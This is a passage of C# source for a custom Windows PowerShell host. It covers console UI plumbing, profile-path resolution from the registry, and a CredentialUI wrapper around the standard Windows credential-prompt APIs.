		/// Wrinting a progress report is not required for the cmdlet to 
		/// work so it is better to do nothing instead of throwing an 
		/// exception.
		/// </summary>
		/// <param name="sourceId">Unique identifier of the source of the record. </param>
		/// <param name="record">A ProgressReport object.</param>
		public override void WriteProgress(long sourceId, ProgressRecord record)
		{
			// Do nothing.
		}

		/// <summary>
		/// Parse a string containing a hotkey character.
		/// Take a string of the form
		///    Yes to &amp;all
		/// and returns a two-dimensional array split out as
		///    "A", "Yes to all".
		/// </summary>
		/// <param name="input">The string to process</param>
		/// <returns>
		/// A two dimensional array containing the parsed components.
		/// </returns>
		private static string[] GetHotkeyAndLabel(string input)
		{
			string[] result = new string[] { String.Empty, String.Empty };
			string[] fragments = input.Split('&');
			if (fragments.Length == 2)
			{
				if (fragments[1].Length > 0)
				{
					result[0] = fragments[1][0].ToString().
					ToUpper(CultureInfo.CurrentCulture);
				}

				result[1] = (fragments[0] + fragments[1]).Trim();
			}
			else
			{
				result[1] = input;
			}

			return result;
		}

		/// <summary>
		/// This is a private worker function splits out the
		/// accelerator keys from the menu and builds a two
		/// dimentional array with the first access containing the
		/// accelerator and the second containing the label string
		/// with the &amp; removed.
		/// </summary>
		/// <param name="choices">The choice collection to process</param>
		/// <returns>
		/// A two dimensional array containing the accelerator characters
		/// and the cleaned-up labels</returns>
		private static string[,] BuildHotkeysAndPlainLabels(
			Collection<ChoiceDescription> choices)
		{
			// we will allocate the result array
			string[,] hotkeysAndPlainLabels = new string[2, choices.Count];

			for (int i = 0; i < choices.Count; ++i)
			{
				string[] hotkeyAndLabel = GetHotkeyAndLabel(choices[i].Label);
				hotkeysAndPlainLabels[0, i] = hotkeyAndLabel[0];
				hotkeysAndPlainLabels[1, i] = hotkeyAndLabel[1];
			}

			return hotkeysAndPlainLabels;
		}
	}

	public class HostUtilities
	{
		/// <summary>
		/// Root registry key for Windows PowerShell.
		/// </summary>
		internal const string PowerShellRootKeyPath = "Software\\Microsoft\\PowerShell";

		/// <summary>
		/// Engine registry key.
		/// </summary>
		internal const string PowerShellEngineKey = "PowerShellEngine";

		/// <summary>
		/// Registry key used to determine the directory where Windows  
		/// PowerShell is installed. 
		/// </summary>
		internal const string PowerShellEngineApplicationBase = "ApplicationBase";

		/// <summary>
		/// The path to the Windows PowerShell version registry key.
		/// </summary>
		internal const string RegistryVersionKey = "1";

		/// <summary>
		/// Gets a PSObject whose base object is currentUserCurrentHost and 
		/// with notes for the other parameters.
		/// </summary>
		/// <param name="allUsersAllHosts">The profile file name for all 
		/// users and all hosts.</param>
		/// <param name="allUsersCurrentHost">The profile file name for 
		/// all users and current host.</param>
		/// <param name="currentUserAllHosts">The profile file name for 
		/// current user and all hosts.</param>
		/// <param name="currentUserCurrentHost">The profile  name for 
		/// current user and current host.</param>
		/// <returns>A PSObject whose base object is currentUserCurrentHost 
		/// and with notes for the other parameters.</returns>
		internal static PSObject GetDollarProfile(string allUsersAllHosts, string allUsersCurrentHost, string currentUserAllHosts, string currentUserCurrentHost)
		{
			PSObject returnValue = new PSObject(currentUserCurrentHost);
			returnValue.Properties.Add(new PSNoteProperty("AllUsersAllHosts", allUsersAllHosts));
			returnValue.Properties.Add(new PSNoteProperty("AllUsersCurrentHost", allUsersCurrentHost));
			returnValue.Properties.Add(new PSNoteProperty("CurrentUserAllHosts", currentUserAllHosts));
			returnValue.Properties.Add(new PSNoteProperty("CurrentUserCurrentHost", currentUserCurrentHost));
			return returnValue;
		}

		/// <summary>
		/// Gets an array of commands that can be run sequentially to set $profile and run the profile commands.
		/// </summary>
		/// <param name="shellId">The identifier of the host or shell used in profile file names.</param>
		/// <returns>The commands used to set $profile.</returns>
		internal static PSCommand[] GetProfileCommands(string shellId)
		{
			return HostUtilities.GetProfileCommands(shellId, false);
		}

		/// <summary>
		/// Gets an array of commands that can be run sequentially to set $profile and run the profile commands.
		/// </summary>
		/// <param name="shellId">The id identifying the host or shell used in profile file names.</param>
		/// <param name="useTestProfile">used from test not to overwrite the profile file names from development boxes</param>
		/// <returns>The commands used to set $profile.</returns>
		internal static PSCommand[] GetProfileCommands(string shellId, bool useTestProfile)
		{
			List<PSCommand> commands = new List<PSCommand>();
			string allUsersAllHosts = HostUtilities.GetFullProfileFileName(null, false, useTestProfile);
			string allUsersCurrentHost = HostUtilities.GetFullProfileFileName(shellId, false, useTestProfile);
			string currentUserAllHosts = HostUtilities.GetFullProfileFileName(null, true, useTestProfile);
			string currentUserCurrentHost = HostUtilities.GetFullProfileFileName(shellId, true, useTestProfile);
			PSObject dollarProfile = HostUtilities.GetDollarProfile(allUsersAllHosts, allUsersCurrentHost, currentUserAllHosts, currentUserCurrentHost);
			PSCommand command = new PSCommand();
			command.AddCommand("set-variable");
			command.AddParameter("Name", "profile");
			command.AddParameter("Value", dollarProfile);
			command.AddParameter("Option", ScopedItemOptions.None);
			commands.Add(command);

			string[] profilePaths = new string[] { allUsersAllHosts, allUsersCurrentHost, currentUserAllHosts, currentUserCurrentHost };
			foreach (string profilePath in profilePaths)
			{
				if (!System.IO.File.Exists(profilePath))
				{
					continue;
				}

				command = new PSCommand();
				command.AddCommand(profilePath, false);
				commands.Add(command);
			}

			return commands.ToArray();
		}

		/// <summary>
		/// Used to get all profile file names for the current or all hosts and for the current or all users.
		/// </summary>
		/// <param name="shellId">null for all hosts, not null for the specified host</param>
		/// <param name="forCurrentUser">false for all users, true for the current user.</param>
		/// <returns>The profile file name matching the parameters.</returns>
		internal static string GetFullProfileFileName(string shellId, bool forCurrentUser)
		{
			return HostUtilities.GetFullProfileFileName(shellId, forCurrentUser, false);
		}

		/// <summary>
		/// Used to get all profile file names for the current or all hosts and for the current or all users.
		/// </summary>
		/// <param name="shellId">null for all hosts, not null for the specified host</param>
		/// <param name="forCurrentUser">false for all users, true for the current user.</param>
		/// <param name="useTestProfile">used from test not to overwrite the profile file names from development boxes</param>
		/// <returns>The profile file name matching the parameters.</returns>
		internal static string GetFullProfileFileName(string shellId, bool forCurrentUser, bool useTestProfile)
		{
			string basePath = null;

			if (forCurrentUser)
			{
				basePath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
				basePath = System.IO.Path.Combine(basePath, "WindowsPowerShell");
			}
			else
			{
				basePath = GetAllUsersFolderPath(shellId);
				if (string.IsNullOrEmpty(basePath))
				{
					return string.Empty;
				}
			}

			string profileName = useTestProfile ? "profile_test.ps1" : "profile.ps1";

			if (!string.IsNullOrEmpty(shellId))
			{
				profileName = shellId + "_" + profileName;
			}

			string fullPath = basePath = System.IO.Path.Combine(basePath, profileName);

			return fullPath;
		}

		/// <summary>
		/// Gets the registry key used to install Windows PowerShell.
		/// </summary>
		/// <param name="shellId">The parameter is not used.</param>
		/// <returns>The regisrty key.</returns>
		internal static string GetApplicationBase(string shellId)
		{
			string engineKeyPath = PowerShellRootKeyPath + "\\" +
				RegistryVersionKey + "\\" + PowerShellEngineKey;

			using (RegistryKey engineKey = Registry.LocalMachine.OpenSubKey(engineKeyPath))
			{
				if (engineKey != null)
				{
					return engineKey.GetValue(PowerShellEngineApplicationBase) as string;
				}
			}

			// The default keys aren't installed, so try and use the entry assembly to
			// get the application base. This works for managed apps like minishells...
			Assembly assem = Assembly.GetEntryAssembly();
			if (assem != null)
			{
				// For minishells, we just return the executable path. 
				return Path.GetDirectoryName(assem.Location);
			}

			// For unmanaged host apps, look for the SMA dll, if it's not GAC'ed then
			// use it's location as the application base...
			assem = Assembly.GetAssembly(typeof(System.Management.Automation.PSObject));
			if (assem != null)
			{
				// For for other hosts. 
				return Path.GetDirectoryName(assem.Location);
			}

			// otherwise, just give up.
			return string.Empty;
		}

		/// <summary>
		/// Used internally in GetFullProfileFileName to get the base path for all users profiles.
		/// </summary>
		/// <param name="shellId">The shellId to use.</param>
		/// <returns>the base path for all users profiles.</returns>
		private static string GetAllUsersFolderPath(string shellId)
		{
			string folderPath = string.Empty;
			try
			{
				folderPath = GetApplicationBase(shellId);
			}
			catch (System.Security.SecurityException)
			{
			}

			return folderPath;
		}
	}

	internal class MyRawUserInterface : PSHostRawUserInterface
	{
		/// <summary>
		/// Gets or sets the background color of text to be written.
		/// This maps pretty directly onto the corresponding .NET Console
		/// property.
		/// </summary>
		public override ConsoleColor BackgroundColor
		{
			get { return Console.BackgroundColor; }
			set { Console.BackgroundColor = value; }
		}

		/// <summary>
		/// Gets or sets the host buffer size adapted from on the 
		/// .NET Console buffer size.
		/// </summary>
		public override Size BufferSize
		{
			get { return new Size(Console.BufferWidth, Console.BufferHeight); }
			set { Console.SetBufferSize(value.Width, value.Height); }
		}

		/// <summary>
		/// Gets or sets the cursor position. This functionality is not 
		/// implemented. The call fails with an exception.
		/// </summary>
		public override Coordinates CursorPosition
		{
			get { throw new NotImplementedException("The CursorPosition property is not implemented by MyRawUserInterface."); }
			set { throw new NotImplementedException("The CursorPosition property is not implemented by MyRawUserInterface."); }
		}

		/// <summary>
		/// Gets or sets the cursor size taken directly from the .NET 
		/// Console cursor size.
		/// </summary>
		public override int CursorSize
		{
			get { return Console.CursorSize; }
			set { Console.CursorSize = value; }
		}

		/// <summary>
		/// Gets or sets the foreground color of the text to be written.
		/// This maps pretty directly onto the corresponding .NET Console
		/// property.
		/// </summary>
		public override ConsoleColor ForegroundColor
		{
			get { return Console.ForegroundColor; }
			set { Console.ForegroundColor = value; }
		}

		/// <summary>
		/// Gets a value that indicates whether a key is available. 
		/// This implementation maps directly to the corresponding 
		/// .NET Console property.
		/// </summary>
		public override bool KeyAvailable
		{
			get { return Console.KeyAvailable; }
		}

		/// <summary>
		/// Gets the maximum physical size of the window adapted from the  
		/// .NET Console LargestWindowWidth and LargestWindowHeight properties.
		/// </summary>
		public override Size MaxPhysicalWindowSize
		{
			get { return new Size(Console.LargestWindowWidth, Console.LargestWindowHeight); }
		}

		/// <summary>
		/// Gets the maximum window size adapted from the .NET Console
		/// LargestWindowWidth and LargestWindowHeight properties.
		/// </summary>
		public override Size MaxWindowSize
		{
			get { return new Size(Console.LargestWindowWidth, Console.LargestWindowHeight); }
		}

		/// <summary>
		/// Gets or sets the window position adapted from the Console window position 
		/// information.
		/// </summary>
		public override Coordinates WindowPosition
		{
			get { return new Coordinates(Console.WindowLeft, Console.WindowTop); }
			set { Console.SetWindowPosition(value.X, value.Y); }
		}

		/// <summary>
		/// Gets or sets the window size adapted from the corresponding .NET Console calls.
		/// </summary>
		public override Size WindowSize
		{
			get { return new Size(Console.WindowWidth, Console.WindowHeight); }
			set { Console.SetWindowSize(value.Width, value.Height); }
		}

		/// <summary>
		/// Gets or sets the title of the window mapped to the Console.Title property.
		/// </summary>
		public override string WindowTitle
		{
			get { return Console.Title; }
			set { Console.Title = value; }
		}

		/// <summary>
		/// Resets the input buffer. This method is not currently 
		/// implemented and returns silently.
		/// </summary>
		public override void FlushInputBuffer()
		{
			// Do nothing.
		}

		/// <summary>
		/// Retrieves a rectangular region of the screen buffer. This method 
		/// is not implemented. The call fails with an exception.
		/// </summary>
		/// <param name="rectangle">A Rectangle object that defines the size of the rectangle</param>
		/// <returns>Throws a NotImplementedException exception.</returns>
		public override BufferCell[,] GetBufferContents(Rectangle rectangle)
		{
			throw new NotImplementedException("The GetBufferContents method is not implemented by MyRawUserInterface.");
		}

		/// <summary>
		/// Reads a pressed, released, or pressed and released keystroke 
		/// from the keyboard device, blocking processing until a keystroke 
		/// is typed that matches the specified keystroke options. This 
		/// functionality is not implemented. The call fails with an 
		/// exception.
		/// </summary>
		/// <param name="options">A bit mask of the options to be used when 
		/// reading from the keyboard. </param>
		/// <returns>Throws a NotImplementedException exception.</returns>
		public override KeyInfo ReadKey(ReadKeyOptions options)
		{
			throw new NotImplementedException("The ReadKey() method is not implemented by MyRawUserInterface.");
		}

		/// <summary>
		/// Crops a region of the screen buffer. This functionality is not 
		/// implemented. The call fails with an exception.
		/// </summary>
		/// <param name="source">A Rectangle structure that identifies the 
		/// region of the screen to be scrolled.</param>
		/// <param name="destination">A Coordinates structure that 
		/// identifies the upper-left coordinates of the region of the 
		/// screen to receive the source region contents.</param>
		/// <param name="clip">A Rectangle structure that identifies the 
		/// region of the screen to include in the operation.</param>
		/// <param name="fill">A BufferCell structure that identifies the 
		/// character and attributes to be used to fill all cells within 
		/// the intersection of the source rectangle and clip rectangle 
		/// that are left "empty" by the move.</param>
		public override void ScrollBufferContents(Rectangle source, Coordinates destination, Rectangle clip, BufferCell fill)
		{
			throw new NotImplementedException("The ScrollBufferContents() method is not implemented by MyRawUserInterface.");
		}

		/// <summary>
		/// Copies a given character to a region of the screen buffer based 
		/// on the coordinates of the region. This method is not implemented. 
		/// The call fails with an exception.
		/// </summary>
		/// <param name="origin">The coordnates of the region.</param>
		/// <param name="contents">A BufferCell structure that defines the fill character.</param>
		public override void SetBufferContents(Coordinates origin, BufferCell[,] contents)
		{
			throw new NotImplementedException("The SetBufferContents() method is not implemented by MyRawUserInterface.");
		}

		/// <summary>
		/// Copies a given character to a rectangular region of the screen 
		/// buffer. This method is not implemented. The call fails with an 
		/// exception.
		/// </summary>
		/// <param name="rectangle">A Rectangle structure that defines the area to be filled.</param>
		/// <param name="fill">A BufferCell structure that defines the fill character.</param>
		public override void SetBufferContents(Rectangle rectangle, BufferCell fill)
		{
			throw new NotImplementedException("The SetBufferContents() method is not implemented by MyRawUserInterface.");
		}
	}

	public static class CredentialUI
	{
		/// <summary>
		/// Show dialog box for generic credential.
		/// </summary>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <returns></returns>
		public static PromptCredentialsResult Prompt(String caption, String message)
		{
			return Prompt(caption, message, null, null);
		}
		/// <summary>
		/// Show dialog box for generic credential.
		/// </summary>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="hwndParent"></param>
		/// <returns></returns>
		public static PromptCredentialsResult Prompt(String caption, String message, IntPtr hwndParent)
		{
			return Prompt(caption, message, hwndParent, null, null);
		}
		/// <summary>
		/// Show dialog box for generic credential.
		/// </summary>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="userName"></param>
		/// <param name="password"></param>
		/// <returns></returns>
		public static PromptCredentialsResult Prompt(String caption, String message, String userName, String password)
		{
			return Prompt(caption, message, IntPtr.Zero, userName, password);
		}
		/// <summary>
		/// Show dialog box for generic credential.
		/// </summary>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="userName"></param>
		/// <param name="password"></param>
		/// <param name="hwndParent"></param>
		/// <returns></returns>
		public static PromptCredentialsResult Prompt(String caption, String message, IntPtr hwndParent, String userName, String password)
		{
			if (Environment.OSVersion.Version.Major >= 6)
			{
				// Windows Vista or 2008 or 7 or later
				return PromptForWindowsCredentials(caption, message, hwndParent, userName, password);
			}
			else
			{
				// Windows 2000 or 2003 or XP
				return PromptForCredentials(Environment.UserDomainName, caption, message, hwndParent, userName, password);
			}
		}
		/// <summary>
		/// Show dialog box for generic credential.
		/// </summary>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <returns></returns>
		public static PromptCredentialsSecureStringResult PromptWithSecureString(String caption, String message)
		{
			return PromptWithSecureString(caption, message, IntPtr.Zero);
		}
		/// <summary>
		/// Show dialog box for generic credential.
		/// </summary>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="hwndParent"></param>
		/// <returns></returns>
		public static PromptCredentialsSecureStringResult PromptWithSecureString(String caption, String message, IntPtr hwndParent)
		{
			return PromptWithSecureString(caption, message, IntPtr.Zero, null, null);
		}
		/// <summary>
		/// Show dialog box for generic credential.
		/// </summary>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="userName"></param>
		/// <param name="password"></param>
		/// <returns></returns>
		public static PromptCredentialsSecureStringResult PromptWithSecureString(String caption, String message, SecureString userName, SecureString password)
		{
			return PromptWithSecureString(caption, message, IntPtr.Zero, userName, password);
		}
		/// <summary>
		/// Show dialog box for generic credential.
		/// </summary>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="userName"></param>
		/// <param name="password"></param>
		/// <param name="hwndParent"></param>
		/// <returns></returns>
		public static PromptCredentialsSecureStringResult PromptWithSecureString(String caption, String message, IntPtr hwndParent, SecureString userName, SecureString password)
		{
			if (Environment.OSVersion.Version.Major >= 6)
			{
				// Windows Vista or 2008 or 7 or later
				return PromptForWindowsCredentialsWithSecureString(caption, message, hwndParent, userName, password);
			}
			else
			{
				// Windows 2000 or 2003 or XP
				return PromptForCredentialsWithSecureString(Environment.UserDomainName, caption, message, hwndParent, userName, password);
			}
		}


		#region Method: PromptForWindowsCredentials
		/// <summary>
		/// Creates and displays a configurable dialog box that allows users to supply credential information by using any credential provider installed on the local computer.
		/// </summary>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <returns></returns>
		public static PromptCredentialsResult PromptForWindowsCredentials(String caption, String message)
		{
			return PromptForWindowsCredentials(caption, message, String.Empty, String.Empty);
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that allows users to supply credential information by using any credential provider installed on the local computer.
		/// </summary>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="hwndParent"></param>
		/// <returns></returns>
		public static PromptCredentialsResult PromptForWindowsCredentials(String caption, String message, IntPtr hwndParent)
		{
			return PromptForWindowsCredentials(caption, message, hwndParent);
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that allows users to supply credential information by using any credential provider installed on the local computer.
		/// </summary>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="userName"></param>
		/// <param name="password"></param>
		/// <returns></returns>
		public static PromptCredentialsResult PromptForWindowsCredentials(String caption, String message, String userName, String password)
		{
			return PromptForWindowsCredentials(caption, message, IntPtr.Zero, userName, password);
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that allows users to supply credential information by using any credential provider installed on the local computer.
		/// </summary>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="hwndParent"></param>
		/// <param name="userName"></param>
		/// <param name="password"></param>
		/// <returns></returns>
		public static PromptCredentialsResult PromptForWindowsCredentials(String caption, String message, IntPtr hwndParent, String userName, String password)
		{
			PromptForWindowsCredentialsOptions options = new PromptForWindowsCredentialsOptions(caption, message)
			{
				HwndParent = hwndParent,
				IsSaveChecked = false
			};
			return PromptForWindowsCredentials(options, userName, password);

		}
		/// <summary>
		/// Creates and displays a configurable dialog box that allows users to supply credential information by using any credential provider installed on the local computer.
		/// </summary>
		/// <param name="options"></param>
		/// <param name="userName"></param>
		/// <param name="password"></param>
		/// <returns></returns>
		public static PromptCredentialsResult PromptForWindowsCredentials(PromptForWindowsCredentialsOptions options, String userName, String password)
		{
			if (String.IsNullOrEmpty(userName) && String.IsNullOrEmpty(password))
				return PromptForWindowsCredentialsInternal<PromptCredentialsResult>(options, null, null);

			using (SecureString userNameS = new SecureString())
			using (SecureString passwordS = new SecureString())
			{
				if (!String.IsNullOrEmpty(userName))
				{
					foreach (var c in userName)
						userNameS.AppendChar(c);
				}
				if (!String.IsNullOrEmpty(password))
				{
					foreach (var c in password)
						passwordS.AppendChar(c);
				}

				userNameS.MakeReadOnly();
				passwordS.MakeReadOnly();
				return PromptForWindowsCredentialsInternal<PromptCredentialsResult>(options, userNameS, passwordS);
			}
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that allows users to supply credential information by using any credential provider installed on the local computer.
		/// </summary>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <returns></returns>
		public static PromptCredentialsSecureStringResult PromptForWindowsCredentialsWithSecureString(String caption, String message)
		{
			return PromptForWindowsCredentialsWithSecureString(caption, message, IntPtr.Zero, null, null);
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that allows users to supply credential information by using any credential provider installed on the local computer.
		/// </summary>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="hwndParent"></param>
		/// <returns></returns>
		public static PromptCredentialsSecureStringResult PromptForWindowsCredentialsWithSecureString(String caption, String message, IntPtr hwndParent)
		{
			return PromptForWindowsCredentialsWithSecureString(caption, message, hwndParent, null, null);
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that allows users to supply credential information by using any credential provider installed on the local computer.
		/// </summary>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="userName"></param>
		/// <param name="password"></param>
		/// <returns></returns>
		public static PromptCredentialsSecureStringResult PromptForWindowsCredentialsWithSecureString(String caption, String message, SecureString userName, SecureString password)
		{
			return PromptForWindowsCredentialsWithSecureString(caption, message, IntPtr.Zero, userName, password);
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that allows users to supply credential information by using any credential provider installed on the local computer.
		/// </summary>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="hwndParent"></param>
		/// <param name="userName"></param>
		/// <param name="password"></param>
		/// <returns></returns>
		public static PromptCredentialsSecureStringResult PromptForWindowsCredentialsWithSecureString(String caption, String message, IntPtr hwndParent, SecureString userName, SecureString password)
		{
			PromptForWindowsCredentialsOptions options = new PromptForWindowsCredentialsOptions(caption, message)
			{
				HwndParent = hwndParent,
				IsSaveChecked = false
			};
			return PromptForWindowsCredentialsWithSecureString(options, userName, password);
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that allows users to supply credential information by using any credential provider installed on the local computer.
		/// </summary>
		/// <param name="options"></param>
		/// <param name="userName"></param>
		/// <param name="password"></param>
		/// <returns></returns>
		public static PromptCredentialsSecureStringResult PromptForWindowsCredentialsWithSecureString(PromptForWindowsCredentialsOptions options, SecureString userName, SecureString password)
		{
			return PromptForWindowsCredentialsInternal<PromptCredentialsSecureStringResult>(options, userName, password);
		}

		private static T PromptForWindowsCredentialsInternal<T>(PromptForWindowsCredentialsOptions options, SecureString userName, SecureString password) where T : class, IPromptCredentialsResult
		{
			NativeMethods.CREDUI_INFO creduiInfo = new NativeMethods.CREDUI_INFO()
			{
				pszCaptionText = options.Caption,
				pszMessageText = options.Message,
				hwndParent = options.HwndParent,
				hbmBanner = options.HbmBanner
			};

			PromptForWindowsCredentialsFlag credentialsFlag = options.Flags;

			IntPtr userNamePtr = IntPtr.Zero;
			IntPtr passwordPtr = IntPtr.Zero;
			Int32 authPackage = 0;
			IntPtr outAuthBuffer = IntPtr.Zero;
			Int32 outAuthBufferSize = 0;
			IntPtr inAuthBuffer = IntPtr.Zero;
			Int32 inAuthBufferSize = 0;
			Boolean save = options.IsSaveChecked;
			try
			{
				if (userName != null || password != null)
				{
					if (userName == null)
						userName = new SecureString();
					if (password == null)
						password = new SecureString();
					userNamePtr = Marshal.SecureStringToCoTaskMemUnicode(userName);
					passwordPtr = Marshal.SecureStringToCoTaskMemUnicode(password);
				}

				// prefilled with UserName or Password
				if (userNamePtr != IntPtr.Zero || passwordPtr != IntPtr.Zero)
				{
					inAuthBufferSize = 1024;
					inAuthBuffer = Marshal.AllocCoTaskMem(inAuthBufferSize);
					if (
						!NativeMethods.CredPackAuthenticationBuffer(0x00, userNamePtr, passwordPtr, inAuthBuffer,
															ref inAuthBufferSize))
					{
						var win32Error = Marshal.GetLastWin32Error();
						if (win32Error == 122 /*ERROR_INSUFFICIENT_BUFFER*/)
						{
							inAuthBuffer = Marshal.ReAllocCoTaskMem(inAuthBuffer, inAuthBufferSize);
							if (
								!NativeMethods.CredPackAuthenticationBuffer(0x00, userNamePtr, passwordPtr, inAuthBuffer,
																	ref inAuthBufferSize))
							{
								throw new Win32Exception(Marshal.GetLastWin32Error());
							}
						}
						else
						{
							throw new Win32Exception(win32Error);
						}
					}
				}

				var retVal = NativeMethods.CredUIPromptForWindowsCredentials(creduiInfo,
																	 options.AuthErrorCode,
																	 ref authPackage,
																	 inAuthBuffer,
																	 inAuthBufferSize,
																	 out outAuthBuffer,
																	 out outAuthBufferSize,
																	 ref save,
																	 credentialsFlag
																	 );

				switch (retVal)
				{
					case NativeMethods.CredUIPromptReturnCode.Cancelled:
						return null;
					case NativeMethods.CredUIPromptReturnCode.Success:
						break;
					default:
						throw new Win32Exception((Int32)retVal);
				}


				if (typeof(T) == typeof(PromptCredentialsSecureStringResult))
				{
					var credResult = NativeMethods.CredUnPackAuthenticationBufferWrapSecureString(true, outAuthBuffer, outAuthBufferSize);
					credResult.IsSaveChecked = save;
					return credResult as T;
				}
				else
				{
					var credResult = NativeMethods.CredUnPackAuthenticationBufferWrap(true, outAuthBuffer, outAuthBufferSize);
					credResult.IsSaveChecked = save;
					return credResult as T;
				}
			}
			finally
			{
				if (inAuthBuffer != IntPtr.Zero)
					Marshal.ZeroFreeCoTaskMemUnicode(inAuthBuffer);
				if (outAuthBuffer != IntPtr.Zero)
					Marshal.ZeroFreeCoTaskMemUnicode(outAuthBuffer);
				if (userNamePtr != IntPtr.Zero)
					Marshal.ZeroFreeCoTaskMemUnicode(userNamePtr);
				if (passwordPtr != IntPtr.Zero)
					Marshal.ZeroFreeCoTaskMemUnicode(passwordPtr);
			}
		}
		#endregion

		#region Method: PromptForCredentials
		/// <summary>
		/// Creates and displays a configurable dialog box that accepts credentials information from a user.
		/// </summary>
		/// <param name="targetName"></param>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <returns></returns>
		public static PromptCredentialsResult PromptForCredentials(String targetName, String caption, String message)
		{
			return PromptForCredentials(new PromptForCredentialsOptions(targetName, caption, message));
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that accepts credentials information from a user.
		/// </summary>
		/// <param name="targetName"></param>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="hwndParent"></param>
		/// <returns></returns>
		public static PromptCredentialsResult PromptForCredentials(String targetName, String caption, String message, IntPtr hwndParent)
		{
			return PromptForCredentials(targetName, caption, message, hwndParent);
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that accepts credentials information from a user.
		/// </summary>
		/// <param name="targetName"></param>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="userName"></param>
		/// <param name="password"></param>
		/// <returns></returns>
		public static PromptCredentialsResult PromptForCredentials(String targetName, String caption, String message, String userName, String password)
		{
			return PromptForCredentials(targetName, caption, message, IntPtr.Zero, userName, password);
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that accepts credentials information from a user.
		/// </summary>
		/// <param name="targetName"></param>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="hwndParent"></param>
		/// <param name="userName"></param>
		/// <param name="password"></param>
		/// <returns></returns>
		public static PromptCredentialsResult PromptForCredentials(String targetName, String caption, String message, IntPtr hwndParent, String userName, String password)
		{
			return PromptForCredentials(new PromptForCredentialsOptions(targetName, caption, message) { HwndParent = hwndParent }, userName, password);
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that accepts credentials information from a user.
		/// </summary>
		/// <param name="options"></param>
		/// <returns></returns>
		public static PromptCredentialsResult PromptForCredentials(PromptForCredentialsOptions options)
		{
			return PromptForCredentials(options, null, null);
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that accepts credentials information from a user.
		/// </summary>
		/// <param name="options"></param>
		/// <param name="userName"></param>
		/// <param name="password"></param>
		/// <returns></returns>
		public static PromptCredentialsResult PromptForCredentials(PromptForCredentialsOptions options, String userName, String password)
		{
			using (SecureString userNameS = new SecureString())
			using (SecureString passwordS = new SecureString())
			{
				if (!String.IsNullOrEmpty(userName))
				{
					foreach (var c in userName)
						userNameS.AppendChar(c);
				}
				if (!String.IsNullOrEmpty(password))
				{
					foreach (var c in password)
						passwordS.AppendChar(c);
				}

				userNameS.MakeReadOnly();
				passwordS.MakeReadOnly();
				return PromptForCredentialsInternal<PromptCredentialsResult>(options, userNameS, passwordS);
			}
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that accepts credentials information from a user.
		/// </summary>
		/// <param name="targetName"></param>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <returns></returns>
		public static PromptCredentialsSecureStringResult PromptForCredentialsWithSecureString(String targetName, String caption, String message)
		{
			return PromptForCredentialsWithSecureString(new PromptForCredentialsOptions(targetName, caption, message));
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that accepts credentials information from a user.
		/// </summary>
		/// <param name="targetName"></param>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="hwndParent"></param>
		/// <returns></returns>
		public static PromptCredentialsSecureStringResult PromptForCredentialsWithSecureString(String targetName, String caption, String message, IntPtr hwndParent)
		{
			return PromptForCredentialsWithSecureString(targetName, caption, message, hwndParent, null, null);
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that accepts credentials information from a user.
		/// </summary>
		/// <param name="targetName"></param>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="userName"></param>
		/// <param name="password"></param>
		/// <returns></returns>
		public static PromptCredentialsSecureStringResult PromptForCredentialsWithSecureString(String targetName, String caption, String message, SecureString userName, SecureString password)
		{
			return PromptForCredentialsWithSecureString(targetName, caption, message, IntPtr.Zero, userName, password);
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that accepts credentials information from a user.
		/// </summary>
		/// <param name="targetName"></param>
		/// <param name="caption"></param>
		/// <param name="message"></param>
		/// <param name="hwndParent"></param>
		/// <param name="userName"></param>
		/// <param name="password"></param>
		/// <returns></returns>
		public static PromptCredentialsSecureStringResult PromptForCredentialsWithSecureString(String targetName, String caption, String message, IntPtr hwndParent, SecureString userName, SecureString password)
		{
			return PromptForCredentialsWithSecureString(new PromptForCredentialsOptions(targetName, caption, message) { HwndParent = hwndParent }, userName, password);
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that accepts credentials information from a user.
		/// </summary>
		/// <param name="options"></param>
		/// <returns></returns>
		public static PromptCredentialsSecureStringResult PromptForCredentialsWithSecureString(PromptForCredentialsOptions options)
		{
			return PromptForCredentialsInternal<PromptCredentialsSecureStringResult>(options, null, null);
		}
		/// <summary>
		/// Creates and displays a configurable dialog box that accepts credentials information from a user.
		/// </summary>
